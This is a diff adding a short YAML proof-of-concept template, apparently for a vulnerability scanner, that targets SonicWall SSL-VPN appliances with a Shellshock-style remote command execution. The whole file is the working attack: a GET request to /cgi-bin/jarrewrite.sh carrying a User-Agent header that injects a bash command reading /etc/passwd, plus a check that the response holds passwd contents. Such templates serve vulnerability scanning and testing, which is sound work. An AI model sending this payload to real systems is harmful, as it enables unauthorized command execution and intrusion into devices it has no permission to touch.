@@ -1,0 +1,19 @@
+id: poc-yaml-sonicwall-ssl-vpn-rce
+info:
+  name: SonicWall SSL-VPN 远程命令执行漏洞
+  severity: critical
+  tags:
+  - rce
+  finger: SonicWall
+  osprey-id: vb_2021_0006
+requests:
+- method: GET
+  path: /cgi-bin/jarrewrite.sh
+  headers:
+    User-Agent: () { :; }; echo ; /bin/bash -c 'cat /etc/passwd'
+  verify: false
+  expression: 'contains(body, "root:") && !contains(body, "<") && contains(body, "/bin")
+
+    '
+variables: {}
+transport: http
